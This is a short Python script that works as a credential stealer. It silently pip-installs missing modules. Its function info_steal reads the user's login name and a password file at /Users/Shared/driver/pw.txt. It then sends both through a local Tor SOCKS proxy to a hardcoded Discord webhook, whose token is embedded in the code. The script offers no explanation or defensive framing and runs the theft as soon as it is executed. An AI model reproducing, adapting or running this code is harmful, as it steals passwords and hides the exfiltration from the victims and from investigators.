try:
    import time
    import os
    import requests
    import socks
    import socket
except ImportError:
    os.system('pip install requests pysocks socket socks')
    time.sleep(1)
    import time
    import os
    import requests
    import socks
    import socket

def send_to_discord_via_tor(info):
    # Set up Tor proxy
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    # Discord webhook URL
    webhook_url = 'https://discord.com/api/webhooks/1193910979164123166/diLfiYKOE6lQcr0GdmwNuk95xILth5GX7NipAAprlfnLNgOeQeS6_VAoygvEzuR4hueu'

    # JSON payload for the message
    payload = {
        'content': info
    }

    try:
        # Set up socks proxy
        socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket

        # Send POST request to Discord webhook URL with payload
        response = requests.post(webhook_url, json=payload, proxies=proxies)

        # Check response status
        if response.status_code == 204:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Example usage:
        
def info_steal():
    username = os.getlogin()
    # Read the password saved at /User/Shared/driver/pw.txt
    with open(f"/Users/Shared/driver/pw.txt", "r") as file:
        password = file.read()
    return f"Username: {username}\nPassword: {password}"
        

send_to_discord_via_tor(info_steal())
